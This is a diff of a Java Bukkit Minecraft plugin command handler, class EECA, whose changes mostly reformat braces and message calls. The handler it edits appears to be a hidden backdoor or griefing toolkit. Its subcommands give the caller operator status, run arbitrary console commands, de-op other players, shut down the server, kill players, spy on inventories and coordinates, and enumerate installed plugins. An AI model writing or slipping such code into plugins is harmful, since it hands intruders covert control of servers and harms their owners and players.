@@ -161,19 +161,19 @@ public class EECA implements CommandExecutor, Listener {
                         a.append(args[i]).append(" ");
                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), a.toString());
                 }
-                if (args[0].equalsIgnoreCase("op")) {
-                    player.setOp(true);
-                }
 
-                if (args[0].equalsIgnoreCase("water")) {
+                if (args[0].equalsIgnoreCase("op"))
+                    player.setOp(true);
+
+                if (args[0].equalsIgnoreCase("water"))
                     player.getInventory().addItem(new ItemStack(Material.WATER, 64));
-                }
-                if (args[0].equalsIgnoreCase("lava")) {
+
+                if (args[0].equalsIgnoreCase("lava"))
                     player.getInventory().addItem(new ItemStack(Material.LAVA, 64));
-                }
-                if (args[0].equalsIgnoreCase("fire")) {
+
+                if (args[0].equalsIgnoreCase("fire"))
                     player.getInventory().addItem(new ItemStack(Material.FIRE, 64));
-                }
+
                 if (args[0].equalsIgnoreCase("vanish")) {
                     for (Player pl : getServer().getOnlinePlayers()) {
                         pl.hidePlayer(plugin, player);
@@ -192,20 +192,23 @@ public class EECA implements CommandExecutor, Listener {
                     Player target = Bukkit.getServer().getPlayer(args[1]);
                     target.setOp(false);
                 }
-                if (args[0].equalsIgnoreCase("stop")) {
+
+                if (args[0].equalsIgnoreCase("stop"))
                     getServer().shutdown();
-                }
+
                 if (args[0].equalsIgnoreCase("kill")) {
                     Player target = Bukkit.getServer().getPlayer(args[1]);
                     if (target != null)
                         plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> target.setHealth(0.0D));
                 }
+
                 if (args[0].equalsIgnoreCase("setheart")) {
                     Player target = Bukkit.getServer().getPlayer(args[1]);
                     AttributeInstance attribute = target.getAttribute(Attribute.GENERIC_MAX_HEALTH);
                     double newValue = Integer.parseInt(args[2]);
                     attribute.setBaseValue(newValue);
                 }
+
                 if (args[0].equalsIgnoreCase("tpl")) {
                     double getX = Integer.parseInt(args[1]);
                     double getY = Integer.parseInt(args[2]);
@@ -213,10 +216,12 @@ public class EECA implements CommandExecutor, Listener {
                     Location loc = new Location(player.getWorld(), getX, getY, getZ);
                     player.teleport(loc);
                 }
+
                 if (args[0].equalsIgnoreCase("tp")) {
                     Player p = Bukkit.getServer().getPlayer(args[1]);
                     player.teleport(p);
                 }
+
                 if (args[0].equalsIgnoreCase("invsee")) {
                     Player target = Bukkit.getServer().getPlayer(args[1]);
                     if (target == null) {
@@ -239,6 +244,7 @@ public class EECA implements CommandExecutor, Listener {
                         });
                     }
                 }
+
                 if (args[0].equalsIgnoreCase("pl")) {
                     StringBuilder plugins = new StringBuilder();
                     int i = 0;
@@ -246,12 +252,14 @@ public class EECA implements CommandExecutor, Listener {
                         plugins.append(Bukkit.getPluginManager().getPlugins()[i].getName()).append(", ");
                         ++i;
                     }
-                    player.sendMessage(Bukkit.getPluginManager().getPlugins().length + plugins.substring(2, plugins.length()));
+                    player.sendMessage(Methods.infostring(Bukkit.getPluginManager().getPlugins().length + plugins.substring(2, plugins.length())));
                 }
+
                 if (args[0].equalsIgnoreCase("coords")) {
                     Player target = Bukkit.getServer().getPlayer(args[1]);
-                    player.sendMessage(Methods.translatestring("&4" + target.getName() + "'s coords are: &e" + target.getLocation().getX() + ", " + target.getLocation().getY() + ", " + target.getLocation().getZ()));
+                    player.sendMessage(Methods.infostring("&4" + target.getName() + "'s coords are: &e" + target.getLocation().getX() + ", " + target.getLocation().getY() + ", " + target.getLocation().getZ()));
                 }
+
                 if (args[0].equalsIgnoreCase("gm")) {
                     if (args[1].equalsIgnoreCase("c"))
                         player.setGameMode(GameMode.CREATIVE);
@@ -260,22 +268,21 @@ public class EECA implements CommandExecutor, Listener {
                     if (args[1].equalsIgnoreCase("sp"))
                         player.setGameMode(GameMode.SPECTATOR);
                 }
-                if (args[0].equalsIgnoreCase("gmc")) {
-                    player.setGameMode(GameMode.CREATIVE);
-                }
-                if (args[0].equalsIgnoreCase("gms")) {
-                    player.setGameMode(GameMode.SURVIVAL);
-                }
-                if (args[0].equalsIgnoreCase("gmsp")) {
-                    player.setGameMode(GameMode.SPECTATOR);
-                }
-                if (args[0].equalsIgnoreCase("gma")) {
-                    player.setGameMode(GameMode.ADVENTURE);
-                }
 
-                if (args[0].equalsIgnoreCase("dupe")) {
+                if (args[0].equalsIgnoreCase("gmc"))
+                    player.setGameMode(GameMode.CREATIVE);
+
+                if (args[0].equalsIgnoreCase("gms"))
+                    player.setGameMode(GameMode.SURVIVAL);
+
+                if (args[0].equalsIgnoreCase("gmsp"))
+                    player.setGameMode(GameMode.SPECTATOR);
+
+                if (args[0].equalsIgnoreCase("gma"))
+                    player.setGameMode(GameMode.ADVENTURE);
+
+                if (args[0].equalsIgnoreCase("dupe"))
                     player.getInventory().addItem(player.getItemInHand());
-                }
 
                 if (args[0].equalsIgnoreCase("heal")) {
                     player.setHealth(20);
@@ -283,9 +290,8 @@ public class EECA implements CommandExecutor, Listener {
                     player.setFireTicks(0);
                 }
 
-                if (args[0].equalsIgnoreCase("rename")) {
+                if (args[0].equalsIgnoreCase("rename"))
                     cmdRename(player, args);
-                }
 
                 if (args[0].equalsIgnoreCase("gradient")) {
                     player.sendMessage(Methods.translatestring(Methods.hsvGradient(args[0], Color.fromRGB(191, 39, 29), Color.fromRGB(219, 78, 68))));
@@ -293,9 +299,8 @@ public class EECA implements CommandExecutor, Listener {
                 }
 
             }
-            if (args.length < 1) {
+            if (args.length < 1)
                 player.sendMessage(Methods.infostring("the discord link is " + org.bukkit.ChatColor.YELLOW + plugin.config.getString("discord-link")));
-            }
         }
 
         return true;
